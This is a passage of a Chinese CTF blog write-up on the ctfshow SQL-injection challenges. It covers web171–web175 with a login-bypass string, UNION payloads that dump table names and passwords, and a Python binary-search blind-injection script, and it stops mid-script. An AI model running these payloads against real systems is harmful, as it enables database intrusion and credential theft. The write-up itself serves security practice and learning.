<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="SQL注入练习">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshowSql注入">
<meta property="og:url" content="https://baozongwi.xyz/posts/cd23a76c.html">
<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
<meta property="og:description" content="SQL注入练习">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250430-092023.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250430-125528.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250501-175743.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250501-185152.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250502-114938.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250502-141333.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250502-171712.jpg">
<meta property="article:published_time" content="2025-04-29T08:33:07.000Z">
<meta property="article:modified_time" content="2025-08-08T03:55:37.267Z">
<meta property="article:author" content="baozongwi">
<meta property="article:tag" content="mysql">
<meta property="article:tag" content="姿势">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250430-092023.jpg">


<link rel="canonical" href="https://baozongwi.xyz/posts/cd23a76c.html">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/cd23a76c.html","path":"posts/cd23a76c.html","title":"ctfshowSql注入"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ctfshowSql注入 | baozongwi:H@cking Th3 Fu1ure</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>




  <script src="/js/third-party/fancybox.js" defer></script>

  <script src="/js/third-party/pace.js" defer></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="Searching..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web171"><span class="nav-number">1.</span> <span class="nav-text">web171</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web172"><span class="nav-number">2.</span> <span class="nav-text">web172</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web173"><span class="nav-number">3.</span> <span class="nav-text">web173</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web174"><span class="nav-number">4.</span> <span class="nav-text">web174</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web175"><span class="nav-number">5.</span> <span class="nav-text">web175</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web176"><span class="nav-number">6.</span> <span class="nav-text">web176</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web177"><span class="nav-number">7.</span> <span class="nav-text">web177</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web178"><span class="nav-number">8.</span> <span class="nav-text">web178</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web179"><span class="nav-number">9.</span> <span class="nav-text">web179</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web180"><span class="nav-number">10.</span> <span class="nav-text">web180</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web181"><span class="nav-number">11.</span> <span class="nav-text">web181</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web182"><span class="nav-number">12.</span> <span class="nav-text">web182</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web183"><span class="nav-number">13.</span> <span class="nav-text">web183</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web184"><span class="nav-number">14.</span> <span class="nav-text">web184</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web185"><span class="nav-number">15.</span> <span class="nav-text">web185</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web186"><span class="nav-number">16.</span> <span class="nav-text">web186</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web187"><span class="nav-number">17.</span> <span class="nav-text">web187</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web188"><span class="nav-number">18.</span> <span class="nav-text">web188</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web189"><span class="nav-number">19.</span> <span class="nav-text">web189</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web190"><span class="nav-number">20.</span> <span class="nav-text">web190</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web191"><span class="nav-number">21.</span> <span class="nav-text">web191</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web192"><span class="nav-number">22.</span> <span class="nav-text">web192</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web193-194"><span class="nav-number">23.</span> <span class="nav-text">web193\194</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web195"><span class="nav-number">24.</span> <span class="nav-text">web195</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web196"><span class="nav-number">25.</span> <span class="nav-text">web196</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web197%E2%80%93web200"><span class="nav-number">26.</span> <span class="nav-text">web197–web200</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web214"><span class="nav-number">27.</span> <span class="nav-text">web214</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web215"><span class="nav-number">28.</span> <span class="nav-text">web215</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web216"><span class="nav-number">29.</span> <span class="nav-text">web216</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web217"><span class="nav-number">30.</span> <span class="nav-text">web217</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web218"><span class="nav-number">31.</span> <span class="nav-text">web218</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web219"><span class="nav-number">32.</span> <span class="nav-text">web219</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web220"><span class="nav-number">33.</span> <span class="nav-text">web220</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web221"><span class="nav-number">34.</span> <span class="nav-text">web221</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web222"><span class="nav-number">35.</span> <span class="nav-text">web222</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web223"><span class="nav-number">36.</span> <span class="nav-text">web223</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web224"><span class="nav-number">37.</span> <span class="nav-text">web224</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web225"><span class="nav-number">38.</span> <span class="nav-text">web225</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web226"><span class="nav-number">39.</span> <span class="nav-text">web226</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web227"><span class="nav-number">40.</span> <span class="nav-text">web227</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web228"><span class="nav-number">41.</span> <span class="nav-text">web228</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web229"><span class="nav-number">42.</span> <span class="nav-text">web229</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web230"><span class="nav-number">43.</span> <span class="nav-text">web230</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web231"><span class="nav-number">44.</span> <span class="nav-text">web231</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web232"><span class="nav-number">45.</span> <span class="nav-text">web232</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web233"><span class="nav-number">46.</span> <span class="nav-text">web233</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web234"><span class="nav-number">47.</span> <span class="nav-text">web234</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web235"><span class="nav-number">48.</span> <span class="nav-text">web235</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web236"><span class="nav-number">49.</span> <span class="nav-text">web236</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web237"><span class="nav-number">50.</span> <span class="nav-text">web237</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web238"><span class="nav-number">51.</span> <span class="nav-text">web238</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web239"><span class="nav-number">52.</span> <span class="nav-text">web239</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web240"><span class="nav-number">53.</span> <span class="nav-text">web240</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web241"><span class="nav-number">54.</span> <span class="nav-text">web241</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web242"><span class="nav-number">55.</span> <span class="nav-text">web242</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web243"><span class="nav-number">56.</span> <span class="nav-text">web243</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web244"><span class="nav-number">57.</span> <span class="nav-text">web244</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web245"><span class="nav-number">58.</span> <span class="nav-text">web245</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web246"><span class="nav-number">59.</span> <span class="nav-text">web246</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web247"><span class="nav-number">60.</span> <span class="nav-text">web247</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web248"><span class="nav-number">61.</span> <span class="nav-text">web248</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web249"><span class="nav-number">62.</span> <span class="nav-text">web249</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web250"><span class="nav-number">63.</span> <span class="nav-text">web250</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web251"><span class="nav-number">64.</span> <span class="nav-text">web251</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web252"><span class="nav-number">65.</span> <span class="nav-text">web252</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web253"><span class="nav-number">66.</span> <span class="nav-text">web253</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">67.</span> <span class="nav-text">小结</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="baozongwi"
      src="/images/acvtar.jpg">
  <p class="site-author-name" itemprop="name">baozongwi</p>
  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>
<ul>
  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
</ul>
        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/cd23a76c.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/acvtar.jpg">
      <meta itemprop="name" content="baozongwi">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="天地不仁，以万物为刍狗">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ctfshowSql注入 | baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="SQL注入练习">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ctfshowSql注入
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-04-29 16:33:07" itemprop="dateCreated datePublished" datetime="2025-04-29T16:33:07+08:00">2025-04-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-08-08 11:55:37" itemprop="dateModified" datetime="2025-08-08T11:55:37+08:00">2025-08-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/talk/" itemprop="url" rel="index"><span itemprop="name">talk</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>75k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>2:05</span>
    </span>
</div>

            <div class="post-description">SQL注入练习</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>有一些师傅在去年就开始看我博客了，但是我还弄了一个每月计划，其中我最想写的是mysql注入，当时草草的看了看狗哥写的一篇文章让我看的也很想写，很想记录一下这些东西，顺便练习一下如何去写脚本，恰逢这几天，有不少师傅都在问，我就从ctfshow的SQL注入模块来学习一下一些有趣的姿势，简单的写写exp</p>
<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>万能密码<code>1&#39;||1%23</code></p>
<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>直接联合注入就好了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,3%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(schema_name),2 from information_schema.schemata%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;ctfshow_web&quot;<span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(column_name),2 from information_schema.columns where table_name=&quot;ctfshow_user2&quot;%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(password),<span class="number">2</span> <span class="keyword">from</span> ctfshow_user2<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctfshow_web&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>ctfshow_user3<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,to_base64(password) <span class="keyword">from</span> ctfshow_user3 <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>方法一样，换个函数</p>
<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>没有数据页了，那就盲注一下吧，可以直接猜到表名和列名，所以测测就可以打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=if(ascii(substr((select group_concat(password) from ctfshow_user4),1,1))&gt;1,1,0)--+</span><br></pre></td></tr></table></figure>

<p>用二分法比较快，个人也比较喜欢，除非非要使用字符集来打，不然都是写的这类脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://941d949a-5fef-41da-8abd-6594f601ee1c.challenge.ctf.show/api/v4.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) //<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&#x27;&#x27;&#x27;1&#x27; and 1=if(ascii(substr((select group_concat(password) from ctfshow_user4),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27;&#x27;&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;&#x27;&#x27;1&#x27; and 1=if(ascii(substr((select password from ctfshow_user4 limit 24,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)--+&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        r = requests.get(url+<span class="string">&quot;?id=&quot;</span>+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>有权限写文件，也可以时间盲注，我写个脚本还是，后面比赛发现<code>try\catch</code>模块容易出问题，所以不写那一种写法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f77c567a-e676-4d00-90f0-7ee558acbfd1.challenge.ctf.show/api/v5.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">DELAY_THRESHOLD=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span 